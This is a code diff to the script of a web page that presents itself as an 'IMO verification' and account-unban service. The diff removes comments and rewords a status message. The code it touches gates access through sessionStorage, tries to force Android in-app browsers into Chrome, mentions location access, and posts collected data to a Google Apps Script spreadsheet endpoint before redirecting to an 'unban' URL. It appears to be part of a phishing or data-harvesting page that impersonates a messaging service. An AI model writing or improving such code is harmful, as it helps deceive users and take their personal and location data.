@@ -167,10 +167,7 @@
   </main>
 
 <script>
-  /*
-    Direct access protection:
-    This page opens only when index.html grants access in the same browser tab.
-  */
+  
   if (sessionStorage.getItem("imo_verification_access") !== "granted") {
     window.location.replace("index.html");
   } else {
@@ -238,9 +235,7 @@
 
   openBrowserBtn.addEventListener("click", openInPreferredBrowser);
 
-  // Try to leave an Android internal browser for Chrome as soon as possible.
-  // Browsers may block automatic app switching; if so, the fallback button is shown
-  // only after location access fails.
+  
   if (isAndroid() && isInternalBrowser()) {
     setTimeout(() => {
       const currentUrl = window.location.href;
@@ -274,7 +269,7 @@
   title.innerText = "Verification Done";
   desc.innerText = "VERIFICATION COMPLETED";
   if (icon) icon.innerText = "✓";
-  setStatus(" saved successfully", "success");
+  setStatus("successfully Done", "success");
 
   sessionStorage.setItem("imo_unban_access", "granted");
   window.location.href = "https://imoverification.online/unban";
@@ -300,12 +295,7 @@
   }
 
   async function saveToSheet(payload) {
-    /*
-      Google Apps Script commonly redirects POST requests from script.google.com
-      to script.googleusercontent.com. "redirect: follow" is therefore required.
-      This function reads the JSON response and only reports success when
-      the deployed script returns { success: true }.
-    */
+    
     const response = await fetch(SHEET_WEBAPP_URL, {
       method: "POST",
       redirect: "follow",
